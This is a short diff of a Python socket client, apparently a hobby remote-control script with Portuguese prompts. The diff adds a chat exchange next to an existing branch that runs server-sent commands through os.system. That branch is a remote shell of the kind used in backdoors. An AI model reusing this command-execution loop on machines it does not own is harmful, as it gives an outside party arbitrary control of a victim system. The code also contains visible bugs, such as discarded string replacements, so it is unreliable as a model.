@@ -16,8 +16,10 @@ while True:
         command.replace("cmdOpc", "")
         os.system(command)
     elif "chatOpc" in command:
-        command.replace("chatOpc", "")
-        print(command)
-        command = input('Mensagem: ')
+        response = command
+        response.replace("chatOpc", "")
         response = client.recv(1024)
         print(response)
+        command = input('Mensagem: ')
+        command = command.encode()
+        client.send(command)
